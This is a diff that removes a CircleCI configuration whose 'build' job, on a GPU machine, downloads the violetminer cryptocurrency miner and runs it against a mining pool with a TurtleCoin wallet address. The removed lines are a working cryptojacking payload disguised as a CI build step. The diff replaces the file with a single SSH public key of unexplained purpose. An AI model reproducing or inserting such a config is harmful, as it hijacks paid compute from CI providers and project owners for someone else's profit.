@@ -1,11 +1,1 @@
-version: 2.1
-
-jobs:
-  build:
-    machine:
-      image: ubuntu-1604-cuda-10.1:201909-23
-    resource_class: gpu.nvidia.large
-    steps:
-      - run: nvidia-smi
-      - run: wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz && tar xvf violetminer-linux-v0.2.2.tar.gz && cd violetminer-linux-v0.2.2 && ./violetminer --pool pool.hashvault.pro:80 --username TRTLv3s1h7QGxQmg6Ar1pST9d8NLjCiX3Gy46qR5orkrX4Xhp1FRZUDR7EU8dANoK2MqUmQdAmBMoVJexjEmW6yt1soAFJxBNYm --password memek --algorithm chukwa/wrkz
-      - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCeNvqrBdEnie+VYQLVITo9OIPuHlHdjr2YzktkFcr6VTrPX9bv4EgSpq1hxejfBOYMhRLY22AvpinpTT2vePEtI6KmM0VQWs9qRzd/ALela3a923q6BCZo9XJxA3Ihcu4IRn+KDEmO16LzotUgnyp/yw6uWpDmyOD5Hh1N2WHoXE7VYT+XqFhyI0IdjVDD89u+26/Pkc7I8P6tKeNlGl/LsNUzv1Um2GbcDei6xNW5lwmbUJNCRgtUJROt5nXKbT5i+EHM2DGJjwZ/3DxK/18Z6nXLAPNi9XjyHBB8Z3oO41Fdsj/UqJo38W51PlBpThz84aDf5CuAG+AtiQC4C/Vz 
